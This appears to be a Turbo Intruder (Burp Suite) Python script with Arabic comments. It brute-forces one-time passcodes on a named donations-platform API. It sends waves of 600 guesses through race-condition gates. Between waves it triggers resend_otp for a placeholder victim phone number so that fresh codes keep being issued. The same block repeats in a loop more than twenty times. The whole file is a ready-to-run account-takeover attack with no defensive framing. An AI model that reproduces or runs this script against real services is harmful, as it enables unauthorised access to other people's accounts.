import time

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           pipeline=False,
                           engine=Engine.BURP
                           )
    
    while True:  # حلقة لا نهائية
        # ------ المرحلة 1: إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race1')
        engine.openGate('race1')

        # ------ الانتظار 5 دقائق و5 ثواني ------ #
        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race2')
        engine.openGate('race2')
                # ------ الانتظار 5 دقائق و5 ثواني ------ #
        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race3')
        engine.openGate('race3')

                # ------ الانتظار 5 دقائق و5 ثواني ------ #
        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race4')
        engine.openGate('race4')

                # ------ الانتظار 5 دقائق و5 ثواني ------ #
        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race5')
        engine.openGate('race5')

                # ------ الانتظار 5 دقائق و5 ثواني ------ #
        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race6')
        engine.openGate('race6')

                # ------ الانتظار 5 دقائق و5 ثواني ------ #
        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race7')
        engine.openGate('race7')

                # ------ الانتظار 5 دقائق و5 ثواني ------ #
        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race8')
        engine.openGate('race8')

                # ------ الانتظار 5 دقائق و5 ثواني ------ #
        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race9')
        engine.openGate('race9')

                # ------ الانتظار 5 دقائق و5 ثواني ------ #
        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race10')
        engine.openGate('race10')

        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race11')
        engine.openGate('race11')

        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race12')
        engine.openGate('race12')

        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race12')
        engine.openGate('race12')

        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race13')
        engine.openGate('race13')

        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race14')
        engine.openGate('race14')

        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race15')
        engine.openGate('race15')

        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race16')
        engine.openGate('race16')

        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race17')
        engine.openGate('race17')

        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race18')
        engine.openGate('race18')

        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race19')
        engine.openGate('race19')

        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race20')
        engine.openGate('race20')

        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race21')
        engine.openGate('race21')

        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race22')
        engine.openGate('race22')

        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race23')
        engine.openGate('race23')

        time.sleep(305)

        # ------ إرسال طلب resend_otp ------ #
        resend_req = '''POST /sessions/resend_otp HTTP/1.1
Host: api.donations.sa
Content-Type: application/json
Content-Length: 45

{"user":{"login":"victim-mobile-number","user_role":0}}'''
        engine.queue(resend_req)

        # ------ 2 ثواني ------ #
        time.sleep(2)

        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
        for i in range(1000, 1600):
            engine.queue(target.req, i, gate='race24')
        engine.openGate('race24')


def handleResponse(req, interesting):
    table.add(req)
